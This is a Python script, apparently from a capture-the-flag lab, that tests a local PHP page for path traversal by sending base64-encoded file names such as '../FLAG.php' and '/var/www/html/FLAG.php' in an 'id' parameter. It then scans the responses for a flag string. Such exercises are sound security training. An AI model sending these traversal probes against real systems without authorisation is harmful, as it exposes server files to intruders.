import requests
import base64
import re

base_url = "http://127.0.0.1:32904/post.php"

# Test cases with base64 encoding
test_cases = [
    ("ScriptKiddie.php", "Known valid file"),
    ("FLAG.php", "Direct FLAG.php"),
    ("../FLAG.php", "Path traversal FLAG.php"),
    ("/FLAG.php", "Absolute path FLAG.php"),
    ("flag.php", "Lowercase flag.php"),
    ("/var/www/html/FLAG.php", "Full path FLAG.php"),
]

print("[*] Testing base64-encoded filenames in id parameter\n")
print("="*80)

for filename, description in test_cases:
    # Base64 encode the filename
    encoded = base64.b64encode(filename.encode()).decode()
    
    url = f"{base_url}?id={encoded}"
    
    print(f"\n[TEST] {description}")
    print(f"  Original: {filename}")
    print(f"  Base64: {encoded}")
    print(f"  URL: {url}")
    
    try:
        response = requests.get(url, timeout=10)
        
        print(f"  Status: {response.status_code}")
        print(f"  Size: {len(response.content)} bytes")
        
        # Check for FLAG{} pattern
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"  [!!!] FLAG FOUND: {flags}")
            print(f"\n[FULL RESPONSE]:\n{response.text}")
        
        # Check response characteristics
        if len(response.content) == 7971:
            print(f"  → Matches known valid size (7971 bytes)")
        elif len(response.content) == 5326:
            print(f"  → Matches blocked/error size (5326 bytes)")
        else:
            print(f"  → ANOMALY: Different size detected!")
            # Print response snippet for anomalies
            if len(response.text) < 500:
                print(f"  Response preview: {response.text[:500]}")
        
        # Check for common error indicators
        if "error" in response.text.lower() or "not found" in response.text.lower():
            print(f"  → Contains error message")
        
    except requests.exceptions.Timeout:
        print(f"  [ERROR] Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"  [ERROR] Request failed: {e}")

print("\n" + "="*80)
print("[*] Testing complete")

